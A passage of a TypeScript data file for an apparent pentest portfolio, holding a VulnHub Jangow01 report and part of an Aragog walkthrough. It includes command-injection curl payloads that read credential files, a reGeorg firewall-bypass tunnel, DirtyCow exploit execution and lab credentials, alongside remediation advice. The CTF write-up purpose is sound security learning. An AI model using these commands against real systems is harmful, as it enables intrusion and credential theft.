// ============================================================
// src/data/reports.ts
// Cyber-RYT2 — Pentest Reports & Walkthrough Data Store
// Author: Rushil Varade
// ============================================================

export type Severity = 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
export type ReportStatus = 'Published' | 'Draft' | 'Archived';
export type ReportType = 'Pentest Report' | 'CTF Walkthrough' | 'Security Assessment' | 'Web Assessment' | 'Lab Report';
export type Platform = 'VulnHub' | 'HackTheBox' | 'TryHackMe' | 'Web Pentest' | 'Internal Lab' | 'Client Report' | 'PentesterLab';
export type Difficulty = 'Easy' | 'Easy-Medium' | 'Medium' | 'Medium-Hard' | 'Hard' | 'Insane';

export interface Finding {
  id: string;
  title: string;
  severity: Severity;
  cvss?: number;
  cwe?: string;
  owasp?: string;
  description: string;
  impact: string;
  recommendations: string[];
  location?: string;
}

export interface AttackStep {
  step: number;
  phase: string;
  title: string;
  description: string;
  commands?: string[];
  findings?: string;
  result?: string;
}

export interface ReportSection {
  id: string;
  title: string;
  content: string;
  subsections?: {
    title: string;
    content: string;
    commands?: string[];
    note?: string;
  }[];
}

export interface TargetInfo {
  ip?: string;
  os?: string;
  hostname?: string;
  webServer?: string;
  openPorts?: string;
  platform?: string;
  releaseDate?: string;
  cms?: string;
  kernel?: string;
  attackerOS?: string;
}

export interface VulnerabilitySummary {
  critical: number;
  high: number;
  medium: number;
  low: number;
  info: number;
}

export interface Report {
  id: string;
  title: string;
  subtitle: string;
  platform: Platform;
  type: ReportType;
  difficulty: Difficulty;
  date: string;
  author: string;
  tags: string[];
  shortDescription: string;
  status: ReportStatus;
  readingTime: string;
  coverImage?: string;
  grade?: string;
  result?: string;
  targetInfo?: TargetInfo;
  executiveSummary: string;
  vulnerabilitySummary?: VulnerabilitySummary;
  methodology: string[];
  findings?: Finding[];
  toolsUsed: { tool: string; purpose: string }[];
  attackChain?: AttackStep[];
  sections: ReportSection[];
  owaspAssessment?: { category: string; status: string; finding: string }[];
  lessonsLearned?: { vector: string; lesson: string }[];
  conclusion: string;
  recommendations: {
    immediate: string[];
    shortTerm: string[];
    longTerm: string[];
  };
  references?: { title: string; url: string }[];
  flags?: { name: string; value: string }[];
}

// ============================================================
// REPORT 1 — Jangow01 VulnHub CTF (Full Pentest Report)
// ============================================================
const jangow01: Report = {
  id: 'jangow01-vulnhub-2026',
  title: 'Jangow01 — VulnHub CTF Machine',
  subtitle: 'Black-Box Penetration Test | Full Root Compromise',
  platform: 'VulnHub',
  type: 'Pentest Report',
  difficulty: 'Medium',
  date: 'March 2026',
  author: 'Rushil Varade',
  grade: 'D — Poor',
  result: 'Full Root Compromise — Both Flags Captured',
  tags: [
    'Command Injection', 'DirtyCow', 'CVE-2016-5195', 'Privilege Escalation',
    'Credential Exposure', 'FTP', 'reGeorg', 'SOCKS Proxy', 'Firewall Bypass',
    'Apache', 'PHP', 'Linux', 'Black-Box'
  ],
  shortDescription:
    'Full black-box penetration test against Jangow01 (Ubuntu 16.04 LTS). Achieved root compromise via unauthenticated OS command injection, plaintext credential reuse, firewall bypass with reGeorg, and DirtyCow kernel exploit (CVE-2016-5195).',
  status: 'Published',
  readingTime: '18 min read',
  targetInfo: {
    ip: '192.168.0.107',
    hostname: 'Jangow01',
    os: 'Ubuntu 16.04.1 LTS — Linux Kernel 4.4.0-31-generic',
    webServer: 'Apache 2.4.18',
    openPorts: '21 (FTP/vsftpd 3.0.3), 22 (SSH), 80 (HTTP/Apache)',
    platform: 'VulnHub — Released 04 November 2021',
    kernel: 'Linux 4.4.0-31-generic',
  },
  executiveSummary: `This report documents a comprehensive black-box penetration test against the Jangow01 VulnHub CTF machine (192.168.0.107). The engagement achieved full root-level compromise through a chain of three core vulnerabilities: an unauthenticated OS command injection, plaintext credential exposure, and a kernel-level privilege escalation exploit (DirtyCow CVE-2016-5195).

The target system was identified as an Ubuntu 16.04.1 LTS server running vsftpd 3.0.3 and Apache 2.4.18 with directory listing enabled. Initial enumeration revealed a publicly accessible PHP file (busque.php) that directly passed user-supplied input to the PHP system() function — providing immediate Remote Code Execution (RCE) as the www-data user with zero authentication.

Subsequent investigation uncovered hardcoded database credentials within both a WordPress configuration file and a backup file. These credentials were reused as FTP login credentials, enabling authenticated file upload to the server. A bidirectional firewall blocked all reverse shell attempts; this was bypassed using a web-based HTTP SOCKS proxy (reGeorg). The target kernel 4.4.0-31 was vulnerable to DirtyCow (CVE-2016-5195), which was compiled and executed on-target to obtain a root shell.`,
  vulnerabilitySummary: { critical: 2, high: 3, medium: 2, low: 2, info: 0 },
  methodology: [
    'Phase 1 — Reconnaissance: Network/port scanning, service enumeration, web technology fingerprinting via WhatWeb and Nikto',
    'Phase 2 — Enumeration: Web directory bruteforce (Gobuster), FTP access testing, HTTP endpoint probing',
    'Phase 3 — Exploitation: Command injection via PHP parameter, credential discovery from backup and config files',
    'Phase 4 — Post-Exploitation: Firewall analysis, HTTP tunnel establishment via reGeorg, reverse shell, flag capture',
    'Phase 5 — Privilege Escalation: Kernel version analysis, DirtyCow exploit compilation and execution',
    'Phase 6 — Reporting: Documentation, CVSS scoring, risk rating, remediation recommendations',
  ],
  toolsUsed: [
    { tool: 'WhatWeb',          purpose: 'Web technology fingerprinting' },
    { tool: 'Nikto v2.5.0',    purpose: 'Web server vulnerability scanning — headers, misconfigurations' },
    { tool: 'Nmap',             purpose: 'Port scanning, service/version detection, OS fingerprinting' },
    { tool: 'Gobuster v3.8',   purpose: 'Recursive web directory and file bruteforcing' },
    { tool: 'cURL',             purpose: 'HTTP request crafting, command injection payload delivery' },
    { tool: 'FTP Client',       purpose: 'Authenticated and anonymous file upload to target' },
    { tool: 'reGeorg',          purpose: 'SOCKS proxy tunneling over HTTP to bypass bidirectional firewall' },
    { tool: 'Netcat / Ncat',   purpose: 'Bind shell connection over SOCKS5 tunnel' },
    { tool: 'Python3 pty',     purpose: 'Upgrading basic shell to fully interactive TTY' },
    { tool: 'GCC (on target)', purpose: 'Compiling DirtyCow C exploit on the target machine' },
    { tool: 'DirtyCow cowroot.c', purpose: 'Kernel exploit CVE-2016-5195 for root privilege escalation' },
    { tool: 'Searchsploit',    purpose: 'CVE and exploit database lookup' },
  ],
  findings: [
    {
      id: 'F-01',
      title: 'OS Command Injection — busque.php',
      severity: 'CRITICAL',
      cvss: 9.8,
      cwe: 'CWE-78',
      owasp: 'A1:2017 — Injection',
      location: 'http://192.168.0.107/site/busque.php?buscar=[PAYLOAD]',
      description: `The buscar GET parameter in busque.php passes user-supplied input directly and unsanitized to PHP's system() function. Any unauthenticated remote attacker can execute arbitrary OS commands with web server privileges (www-data). No authentication, input validation, encoding, or output filtering is applied. The entire PHP file is a single line: <?php system($_GET['buscar']); ?>`,
      impact: 'Complete unauthenticated Remote Code Execution as www-data. Enabled reading of all sensitive configuration files and credentials, user-level flag capture, and served as the initial foothold for the entire attack chain including firewall bypass and root compromise.',
      recommendations: [
        'Immediately remove or disable busque.php from the web server',
        'Never pass user-supplied input to OS-level commands (system, shell_exec, exec, passthru)',
        'Use parameterized APIs or purpose-built libraries instead of raw shell calls',
        'Apply strict input validation — whitelist only permitted characters',
        'Run the web application process as a low-privilege user with minimal OS permissions',
        'Deploy a Web Application Firewall (WAF) to detect and block injection payloads',
        'Audit all PHP files for similar dangerous function patterns',
      ],
    },
    {
      id: 'F-02',
      title: 'Kernel Privilege Escalation — DirtyCow (CVE-2016-5195)',
      severity: 'CRITICAL',
      cvss: 7.8,
      cwe: 'CWE-362',
      owasp: 'A9:2017 — Using Components with Known Vulnerabilities',
      location: 'Kernel: Linux 4.4.0-31-generic',
      description: `The target runs Linux kernel 4.4.0-31-generic, vulnerable to CVE-2016-5195 (DirtyCow). This vulnerability exploits a race condition in the Linux kernel memory subsystem related to copy-on-write (COW) handling of private read-only memory mappings. A local attacker with any level of shell access can exploit this to overwrite arbitrary files and escalate to root. The cowroot.c exploit overwrites /usr/bin/passwd with a SUID root shell binary. The kernel patch was available since October 2016 — nearly a decade ago.`,
      impact: 'Full root privilege escalation from any local shell including low-privilege www-data. Complete system compromise: ability to read all files, modify system configuration, install persistent backdoors, exfiltrate all data, and pivot to other networked systems.',
      recommendations: [
        'Patch the Linux kernel immediately: sudo apt-get update && sudo apt-get upgrade linux-image',
        'Upgrade to kernel version 4.8.3 or later (DirtyCow was patched in October 2016)',
        'Implement a formal patch management process with defined SLAs for critical CVEs',
        'Restrict compilation tools (gcc) and build toolchains on production servers',
        'Implement kernel hardening: AppArmor, SELinux, or grsecurity',
      ],
    },
    {
      id: 'F-03',
      title: 'Plaintext Credential Exposure in Backup & Config Files',
      severity: 'HIGH',
      cvss: 7.5,
      cwe: 'CWE-798',
      owasp: 'A3:2017 — Sensitive Data Exposure',
      location: '/var/www/html/.backup | /site/wordpress/config.php',
      description: 'Database credentials for two separate services are stored in plaintext within web-accessible files. The .backup file exposes jangow01:abygurl69 and the WordPress config.php exposes desafio02:abygurl69. Both files were readable via the command injection vulnerability.',
      impact: 'Exposure of database credentials and discovery of valid system account credentials. Credential reuse across FTP enabled authenticated file upload, which was critical in deploying the web proxy and the privilege escalation exploit.',
      recommendations: [
        'Remove all backup files and .backup/.bak extensions from the web root immediately',
        'Store database credentials in environment variables or a dedicated secrets manager',
        'Rotate all exposed passwords immediately and audit for unauthorized database access',
        'Configure the web server to block direct access to .backup and configuration files',
        'Never store credentials in any file accessible via the web server document root',
      ],
    },
    {
      id: 'F-04',
      title: 'Password Reuse Across FTP and Database Services',
      severity: 'HIGH',
      cvss: 8.1,
      cwe: 'CWE-521',
      owasp: "A2:2017 — Broken Authentication",
      location: 'FTP: ftp://jangow01@192.168.0.107 | DB: MySQL on localhost',
      description: "The password 'abygurl69' discovered in both the .backup file and the WordPress config.php was found to be identical to the FTP password for the system user jangow01. This credential reuse meant that a single credential discovery immediately granted authenticated FTP access.",
      impact: 'Authenticated FTP access enabling upload of arbitrary files. Leveraged to upload the reGeorg proxy tunnel script and the DirtyCow exploit, directly enabling both firewall bypass and root escalation.',
      recommendations: [
        'Enforce a strict password uniqueness policy — no password should be reused across any two services',
        'Implement a password manager for credential management across all services',
        'Consider disabling FTP entirely in favour of SFTP/SCP with key-based authentication',
        'Implement multi-factor authentication for all remote access services',
      ],
    },
    {
      id: 'F-05',
      title: 'Firewall Bypass via HTTP-Tunneled SOCKS Proxy (reGeorg)',
      severity: 'HIGH',
      cvss: 8.6,
      cwe: 'CWE-284',
      owasp: 'A5:2017 — Broken Access Control',
      location: 'http://192.168.0.107/site/proxy.php',
      description: 'Although the target had a bidirectional firewall restricting all non-HTTP traffic, the existing RCE and FTP access was used to upload and host a web-based SOCKS5 proxy (reGeorg tunnel.nosocket.php). This proxy tunnels arbitrary TCP connections over HTTP, completely bypassing the firewall.',
      impact: 'Complete bypass of perimeter firewall protection. Enabled full interactive shell access despite restrictive network controls.',
      recommendations: [
        'Implement application-layer inspection (WAF/NGFW) to detect and block web shell and proxy script uploads',
        'Monitor HTTP traffic for anomalous patterns',
        'Restrict file upload permissions for the web server user',
        'Deploy file integrity monitoring (AIDE, Tripwire) to detect unauthorized file changes',
      ],
    },
    {
      id: 'F-06',
      title: 'Apache Directory Listing Enabled',
      severity: 'MEDIUM',
      cvss: 5.3,
      cwe: 'CWE-548',
      owasp: 'A6:2017 — Security Misconfiguration',
      location: 'http://192.168.0.107/ and all subdirectories',
      description: 'The Apache web server has Options Indexes enabled, allowing any visitor to browse the complete directory structure of the web root without authentication. Immediately exposed the /site/ directory, /wordpress/ subdirectory, and all file names including busque.php and config.php.',
      impact: 'Information disclosure of the complete directory and file structure. Enabled immediate discovery of the command injection endpoint and the WordPress configuration file.',
      recommendations: [
        'Disable directory listing: remove Options Indexes or add Options -Indexes to .htaccess',
        'Ensure no sensitive configuration files are stored within publicly accessible web directories',
        'Add a custom 403/404 error page to prevent information leakage',
      ],
    },
    {
      id: 'F-07',
      title: 'World-Readable Home Directory and User Files',
      severity: 'MEDIUM',
      cvss: 4.3,
      cwe: 'CWE-732',
      owasp: 'A6:2017 — Security Misconfiguration',
      location: '/home/jangow01/user.txt',
      description: 'The user flag file at /home/jangow01/user.txt was readable by the www-data user, indicating world-readable permissions on the file or insufficient access controls on the home directory.',
      impact: 'User-level flag capture without privilege escalation. Exposes SSH keys, stored credentials, and browser session data to any process running as www-data.',
      recommendations: [
        'Restrict permissions on home directories: chmod 700 /home/jangow01',
        'Ensure sensitive files are owner-readable only: chmod 600',
        'Regularly audit file permissions: find /home -perm -o=r',
      ],
    },
    {
      id: 'F-08',
      title: 'Anonymous FTP Write Access',
      severity: 'LOW',
      cvss: 2.6,
      cwe: 'CWE-306',
      owasp: 'A5:2017 — Broken Access Control',
      location: 'ftp://192.168.0.107:21',
      description: 'Anonymous FTP access allowed file uploads to the /tmp directory without any credentials. Provides a staging area for exploit files, shells, and tunneling tools independent of credential-based FTP access.',
      impact: 'Attackers can stage arbitrary payloads in /tmp without any authentication.',
      recommendations: [
        'Disable anonymous FTP write access in vsftpd.conf: anonymous_enable=NO',
        'Replace FTP entirely with SFTP/SCP and enforce key-based authentication',
        'Implement logging and alerting on all FTP upload activities',
      ],
    },
  ],
  attackChain: [
    { step: 1, phase: 'Reconnaissance',      title: 'Service Discovery',            description: 'Nmap + WhatWeb + Nikto reveal ports 21 (FTP/vsftpd 3.0.3) and 80 (HTTP/Apache 2.4.18). Missing headers and directory indexing confirmed.', commands: ['whatweb http://192.168.0.107', 'nikto -h http://192.168.0.107', 'nmap -sV -sC 192.168.0.107'] },
    { step: 2, phase: 'Web Enumeration',      title: 'Directory Discovery',          description: 'Directory listing exposes /site/ structure. Gobuster confirms /site/wordpress/ and busque.php endpoint.', commands: ['gobuster dir -u http://192.168.0.107/site -w /usr/share/wordlists/dirb/common.txt'] },
    { step: 3, phase: 'Exploitation',         title: 'Command Injection [CRITICAL]', description: 'busque.php passes unsanitized GET param directly to system() — unauthenticated RCE as www-data confirmed immediately.', commands: ['curl "http://192.168.0.107/site/busque.php?buscar=ping+192.168.0.106+-c+1"'], result: 'Unauthenticated RCE confirmed' },
    { step: 4, phase: 'Credential Discovery', title: 'Plaintext Credentials Found',  description: '.backup and wordpress/config.php expose plaintext credentials for jangow01:abygurl69. User flag captured.', commands: ['curl ".../busque.php?buscar=cat+/var/www/html/.backup"', 'curl ".../busque.php?buscar=cat+/home/jangow01/user.txt"'], result: 'Credentials: jangow01:abygurl69 | User flag captured' },
    { step: 5, phase: 'FTP Access',           title: 'Credential Reuse',             description: 'FTP login jangow01:abygurl69 succeeds — same password reused across DB and FTP. File upload capability gained.', commands: ['ftp ftp://jangow01:abygurl69@192.168.0.107/'], result: 'Authenticated FTP access' },
    { step: 6, phase: 'Firewall Bypass',      title: 'HTTP Tunnel via reGeorg',      description: 'Bidirectional firewall blocks all reverse shells. reGeorg HTTP SOCKS proxy uploaded via FTP + RCE. HTTP tunnel established.', commands: ['python2.7 reGeorgSocksProxy.py -u http://192.168.0.107/site/proxy.php'] },
    { step: 7, phase: 'Shell Access',         title: 'Interactive Shell',             description: 'Perl bind shell uploaded and executed. Netcat connects via SOCKS5 tunnel on localhost:8888. Shell upgraded via python3 pty.', commands: ['ncat --proxy 127.0.0.1:8888 --proxy-type socks5 127.0.0.1 51337', "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"] },
    { step: 8, phase: 'Privilege Escalation', title: 'DirtyCow CVE-2016-5195 [CRITICAL]', description: 'Kernel 4.4.0-31 vulnerable to DirtyCow CVE-2016-5195. cowroot.c compiled on-target with GCC and executed. Root shell obtained.', commands: ['gcc cowroot.c -o cowroot -pthread', './cowroot'], result: 'uid=0(root) gid=0(root)' },
    { step: 9, phase: 'Full Compromise',      title: 'Root Flag Captured',            description: 'Root flag captured from /root/proof.txt. uid=0(root). Complete system compromise achieved.', commands: ['cat /root/proof.txt'], result: 'da39a3ee5e6b4b0d3255bfef95601890afd80709' },
  ],
  sections: [
    {
      id: 'reconnaissance',
      title: 'Phase 1 — Reconnaissance & Scanning',
      content: 'WhatWeb and Nikto were run against the target to fingerprint services and identify misconfigurations. Nmap was then used for a full-port scan with service/version detection.',
      subsections: [
        {
          title: 'Port Scan Results',
          content: 'Three open ports identified: 21/tcp (vsftpd 3.0.3), 80/tcp (Apache 2.4.18 Ubuntu), 22/tcp (OpenSSH). Nikto revealed missing security headers (X-Frame-Options, X-Content-Type-Options) and confirmed directory indexing was enabled on the Apache server.',
          commands: ['whatweb http://192.168.0.107', 'nikto -h http://192.168.0.107', 'nmap -sV -sC 192.168.0.107'],
        },
      ],
    },
    {
      id: 'enumeration',
      title: 'Phase 2 — Web Application Enumeration',
      content: 'Browsing to http://192.168.0.107/ revealed an Apache directory listing exposing a /site/ folder. Gobuster was used to enumerate further.',
      subsections: [
        {
          title: 'Directory Bruteforce',
          content: 'Results revealed: /assets /css /js /index.html /wordpress — and critically, a file named busque.php (Spanish: "to search"), immediately suggesting dynamic backend functionality worth investigating.',
          commands: ['gobuster dir -u http://192.168.0.107/site -w /usr/share/wordlists/dirb/common.txt'],
        },
      ],
    },
    {
      id: 'exploitation',
      title: 'Phase 3 — Remote Code Execution via Command Injection',
      content: 'Investigation of busque.php revealed it accepted a GET parameter (buscar). Injecting a ping command confirmed unauthenticated RCE as www-data. Source code review confirmed the entire PHP file was a single line:',
      subsections: [
        {
          title: 'Vulnerability Analysis',
          content: 'This is a textbook OS Command Injection vulnerability (OWASP A1 — Injection). The following commands were executed via cURL to enumerate the system:',
          commands: [
            '# Confirm RCE\ncurl "http://192.168.0.107/site/busque.php?buscar=ping+192.168.0.106+-c+1"',
            '# Read backup file — CRITICAL: Exposed jangow01:abygurl69 credentials\ncurl "http://192.168.0.107/site/busque.php?buscar=cat+/var/www/html/.backup"',
            '# Read WordPress config — Exposed desafio02:abygurl69\ncurl "http://192.168.0.107/site/busque.php?buscar=cat+wordpress/config.php"',
            '# Capture user flag\ncurl "http://192.168.0.107/site/busque.php?buscar=cat+/home/jangow01/user.txt"',
          ],
          note: 'Vulnerable PHP source: <?php system($_GET["buscar"]); ?> — single line, zero input validation, zero authentication.',
        },
      ],
    },
    {
      id: 'firewall-bypass',
      title: 'Phase 4 — Firewall Analysis & Shell Acquisition',
      content: 'All reverse shell attempts were blocked by a bidirectional firewall. Netcat-openbsd on the target does not support the -e flag, and all outbound TCP connections (ports 80, 443, 51337) were filtered. HTTP was the only permitted protocol.',
      subsections: [
        {
          title: 'reGeorg HTTP Tunnel',
          content: 'Using the discovered FTP credentials (jangow01:abygurl69), the reGeorg PHP SOCKS proxy tunnel was uploaded to /tmp/ via FTP and moved to the web root via RCE. A Perl bind shell was then uploaded and triggered. Netcat connected through the SOCKS5 tunnel on localhost:8888, finally establishing an interactive shell as www-data.',
          commands: [
            '# Upload via FTP\nftp ftp://jangow01:abygurl69@192.168.0.107/\nput tunnel.nosocket.php',
            '# Start SOCKS proxy\npython2.7 reGeorgSocksProxy.py -u http://192.168.0.107/site/proxy.php',
            '# Connect through tunnel\nncat --proxy 127.0.0.1:8888 --proxy-type socks5 127.0.0.1 51337',
            "# Upgrade shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
          ],
        },
      ],
    },
    {
      id: 'privesc',
      title: 'Phase 5 — Privilege Escalation via DirtyCow (CVE-2016-5195)',
      content: 'Kernel version enumeration identified Linux 4.4.0-31-generic — vulnerable to DirtyCow (CVE-2016-5195). The cowroot.c exploit was transferred to the target via FTP, compiled using GCC (available on target), and executed.',
      subsections: [
        {
          title: 'DirtyCow Exploitation',
          content: 'CVE-2016-5195 exploits a race condition in the Linux kernel memory subsystem. The cowroot.c variant overwrites /usr/bin/passwd with a SUID root shell binary, obtaining uid=0.',
          commands: [
            '# Transfer exploit via FTP\nftp ftp://jangow01:abygurl69@192.168.0.107/\nput cowroot.c /tmp/cowroot.c',
            '# Compile on target\ngcc cowroot.c -o cowroot -pthread',
            '# Execute\n./cowroot',
            '# Verify root\nwhoami\n# → root',
            '# Capture root flag\ncat /root/proof.txt',
          ],
          note: 'CVE-2016-5195 | CVSS 7.8 HIGH | Affected: Linux kernel < 4.8.3 | Patched: October 2016',
        },
      ],
    },
  ],
  owaspAssessment: [
    { category: 'A1:2017 — Injection',                  status: 'FAIL', finding: 'OS Command Injection (F-01)' },
    { category: 'A2:2017 — Broken Authentication',       status: 'N/A',  finding: 'Not directly tested' },
    { category: 'A3:2017 — Sensitive Data Exposure',     status: 'FAIL', finding: 'Plaintext credentials in .backup and config.php (F-03)' },
    { category: 'A5:2017 — Broken Access Control',       status: 'FAIL', finding: 'Anonymous FTP write access (F-08)' },
    { category: 'A6:2017 — Security Misconfiguration',   status: 'FAIL', finding: 'Directory listing + missing headers (F-06)' },
    { category: 'A9:2017 — Known Vulnerable Components', status: 'FAIL', finding: 'DirtyCow kernel CVE-2016-5195 (F-02)' },
  ],
  lessonsLearned: [
    { vector: 'Single unauthenticated PHP endpoint gave full RCE',                      lesson: 'Code review + WAF deployment can stop entire attack chains at Step 1' },
    { vector: 'Credentials discovered in web-accessible config and backup files',        lesson: 'Secrets management is non-negotiable — no credentials in web-accessible files' },
    { vector: 'Password reuse across FTP and DB amplified single credential discovery',  lesson: 'Unique credentials per service dramatically limits lateral movement impact' },
    { vector: 'A 10-year-old kernel vulnerability (DirtyCow) was present and unpatched', lesson: 'Kernel patch management failure has cascading consequences — treat critical CVEs urgently' },
    { vector: 'Bidirectional firewall slowed but did not stop the attacker',             lesson: 'Network controls alone are insufficient — application-layer security is essential' },
  ],
  flags: [
    { name: 'User Flag (user.txt)',  value: 'd41d8cd98f00b204e9800998ecf8427e' },
    { name: 'Root Flag (proof.txt)', value: 'da39a3ee5e6b4b0d3255bfef95601890afd80709' },
  ],
  conclusion: `The Jangow01 machine demonstrates how a single critical misconfiguration — an unauthenticated OS command injection — can serve as the entry point for a complete system compromise. The attack chain required no advanced techniques: standard tools (Nmap, Gobuster, cURL, reGeorg, DirtyCow) were sufficient to move from zero access to root.

The most significant business risk is the combination of unvalidated user input passed to system(), decade-old unpatched kernel CVEs, and plaintext credential storage. Any one of these findings would be serious in isolation; together they create an attack chain with no significant barriers between internet access and full system control.

Remediation priority should focus on: (1) immediate removal of the command injection endpoint, (2) kernel patching, (3) credential rotation and secrets management, and (4) establishing a formal patch management process with CVSS-based SLAs.`,
  recommendations: {
    immediate: [
      'Remove busque.php immediately — never use system() with unsanitized user input',
      'Upgrade Linux kernel to 4.8.3+ (DirtyCow patch available since October 2016)',
      'Remove plaintext credentials from all config files — move to environment variables or secrets manager',
      'Change all passwords and enforce uniqueness across services',
    ],
    shortTerm: [
      'Disable Apache directory listing (Options -Indexes) across all virtual hosts',
      'Restrict file system permissions: chmod 700 /home/jangow01',
      'Disable anonymous FTP write access or replace FTP with SFTP/SCP',
      'Implement input validation and output encoding across all web endpoints',
      'Deploy a Web Application Firewall (WAF)',
      'Audit all PHP files for dangerous functions: system(), exec(), shell_exec(), passthru()',
      'Add HTTP security headers: X-Frame-Options, X-Content-Type-Options, HSTS',
    ],
    longTerm: [
      'Establish a Secure Software Development Lifecycle (SSDLC)',
      'Conduct regular penetration tests at minimum annually',
      'Implement continuous vulnerability scanning using Nessus, OpenVAS, or Qualys',
      'Deploy an IDS/IPS on the network perimeter',
      'Develop a formal Incident Response Plan',
    ],
  },
  references: [
    { title: 'VulnHub — Jangow 1.0.1',    url: 'https://www.vulnhub.com/entry/jangow-101,754/' },
    { title: 'CVE-2016-5195 DirtyCow',    url: 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195' },
    { title: 'reGeorg SOCKS proxy',        url: 'https://github.com/sensepost/reGeorg' },
    { title: 'OWASP Command Injection',    url: 'https://owasp.org/www-community/attacks/Command_Injection' },
  ],
};

// ============================================================
// REPORT 2 — Harry Potter: Aragog VulnHub CTF Walkthrough
// ============================================================
const aragog: Report = {
  id: 'aragog-vulnhub-2026',
  title: 'Harry Potter: Aragog',
  subtitle: 'Complete Penetration Testing Walkthrough — VulnHub CTF',
  platform: 'VulnHub',
  type: 'CTF Walkthrough',
  difficulty: 'Easy-Medium',
  date: 'March 25, 2026',
  author: 'Rushil Varade',
  tags: [
    'WordPress', 'WPScan', 'Metasploit', 'CVE-2020-25213', 'WP File Manager',
    'LinPEAS', 'John the Ripper', 'Hash Cracking', 'Cronjob Abuse',
    'Privilege Escalation', 'PHP', 'Apache', 'Linux', 'Debian'
  ],
  shortDescription:
    'Complete CTF walkthrough for Harry Potter: Aragog on VulnHub. Compromised via WordPress File Manager RCE (CVE-2020-25213), extracted credentials via LinPEAS, cracked PHPass hash with John the Ripper, and escalated to root via writable root-owned cronjob abuse.',
  status: 'Published',
  readingTime: '14 min read',
  targetInfo: {
    ip: '192.168.31.34',
    hostname: 'Aragog',
    os: 'Linux — Debian (Aragog 4.19.0)',
    webServer: 'Apache 2.4.38',
    openPorts: '22 (SSH/OpenSSH 7.9p1), 80 (HTTP/Apache)',
    cms: 'WordPress 5.0.12',
    attackerOS: 'Kali Linux (ThinkPad) — 192.168.31.38',
  },
  executiveSummary: `Harry Potter: Aragog is a beginner-to-intermediate VulnHub machine themed around the Harry Potter universe. The objective is to find two hidden Horcruxes by exploiting a vulnerable WordPress installation and escalating privileges to root.

The attack chain began with web enumeration revealing a WordPress installation at /blog. WPScan identified WordPress 5.0.12 as insecure. The WP File Manager plugin (v6.0–6.8) was vulnerable to CVE-2020-25213 — an unauthenticated RCE exploited via Metasploit.

Post-exploitation with LinPEAS revealed hardcoded MySQL credentials in wp-config.php. A MySQL dump exposed the hagrid98 user's PHPass hash, cracked in seconds by John the Ripper using rockyou.txt. SSH login as hagrid98 captured the first Horcrux. Privilege escalation was achieved by overwriting a root-owned, world-writable cronjob (/opt/.backup.sh) with a reverse shell, obtaining root and the second Horcrux.`,
  methodology: [
    'Reconnaissance: IP discovery via netdiscover/arp-scan, Nmap full service scan',
    'Web Enumeration: Gobuster directory brute-force, manual browsing',
    'WordPress Analysis: WPScan for version/plugin/config discovery',
    'Exploitation: Metasploit wp_file_manager_rce module (CVE-2020-25213)',
    'Post-Exploitation: LinPEAS enumeration, MySQL credential extraction and dump',
    'Hash Cracking: John the Ripper with rockyou.txt against PHPass hash',
    'Lateral Movement: SSH login with cracked credentials',
    'Privilege Escalation: pspy process monitoring, writable cronjob abuse',
  ],
  toolsUsed: [
    { tool: 'Nmap',                   purpose: 'Full service/version/OS scan (-sV -sC -A)' },
    { tool: 'Gobuster v3.8.2',        purpose: 'Web directory brute-force' },
    { tool: 'WPScan',                 purpose: 'WordPress version, plugin, and configuration scanning' },
    { tool: 'Metasploit Framework',   purpose: 'wp_file_manager_rce exploit (CVE-2020-25213)' },
    { tool: 'LinPEAS',                purpose: 'Linux privilege escalation enumeration script' },
    { tool: 'MySQL Client',           purpose: 'Database access and WordPress user dump' },
    { tool: 'John the Ripper',        purpose: 'PHPass hash cracking with rockyou.txt wordlist' },
    { tool: 'pspy',                   purpose: 'Process monitoring without root privileges' },
    { tool: 'Netcat',                 purpose: 'Reverse shell listener' },
    { tool: 'Python3 HTTP Server',    purpose: 'File transfer to target' },
  ],
  findings: [
    {
      id: 'CVE-2020-25213',
      title: 'WP File Manager RCE — CVE-2020-25213',
      severity: 'CRITICAL',
      cvss: 9.8,
      cwe: 'CWE-434',
      location: '/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
      description: 'An unauthenticated remote code execution vulnerability in the WP File Manager plugin (versions 6.0–6.8) via the elFinder component. An attacker can upload a malicious PHP file without authentication and execute arbitrary OS commands. The elFinder endpoint performs no authentication check, allowing Metasploit to upload a PHP webshell directly into the plugin directory.',
      impact: 'Complete unauthenticated Remote Code Execution. Initial foothold on the target server as the web server process user. Enables all subsequent attack steps including database access, credential extraction, and privilege escalation.',
      recommendations: [
        'Update WP File Manager to version 6.9 or later immediately',
        'Enable automatic updates for all WordPress plugins',
        'Subscribe to WPVulnDB or Wordfence alerts for plugin CVEs',
        'Deploy a WAF with rules blocking elFinder connector exploitation attempts',
      ],
    },
    {
      id: 'FIND-02',
      title: 'Hardcoded DB Credentials in wp-config.php',
      severity: 'HIGH',
      cvss: 7.5,
      cwe: 'CWE-798',
      description: 'MySQL credentials (root:mySecr3tPass) were stored in plaintext in wp-config.php. Discovered automatically by LinPEAS. The database user was root — providing full database access with no restrictions.',
      impact: 'Full MySQL access as root, enabling complete database dump including all WordPress user password hashes.',
      recommendations: [
        'Never store plaintext credentials in wp-config.php on production servers',
        'Use environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault)',
        'Use a dedicated low-privilege WordPress DB user, never root',
      ],
    },
    {
      id: 'FIND-03',
      title: 'Weak Password — PHPass Hash Cracked in Seconds',
      severity: 'HIGH',
      cvss: 7.5,
      description: "WordPress user hagrid98 used the password 'password123' — cracked in under 30 seconds by John the Ripper against the rockyou.txt wordlist. The cracked credentials provided direct SSH access to the system.",
      impact: 'Lateral movement to SSH login as hagrid98, first Horcrux captured.',
      recommendations: [
        'Enforce a minimum 16-character password policy',
        'Enable two-factor authentication on all WordPress admin accounts',
        'Use a password manager for credential management',
      ],
    },
    {
      id: 'FIND-04',
      title: 'Writable Root-Owned Cronjob — /opt/.backup.sh',
      severity: 'CRITICAL',
      cvss: 8.8,
      cwe: 'CWE-732',
      description: 'The file /opt/.backup.sh runs periodically as root but is writable by the low-privileged hagrid98 user. Any code injected into the script executes as root on the next cron cycle (typically within 60 seconds). No CVE required — this is a pure misconfiguration.',
      impact: 'Complete privilege escalation to root. Any code injected runs as uid=0. Persistent backdoor: the reverse shell re-executes every cron cycle.',
      recommendations: [
        'Restrict permissions: chmod 700 /opt/.backup.sh && chown root:root /opt/.backup.sh',
        'Regularly audit cron scripts: no root-owned cron script should be writable by unprivileged users',
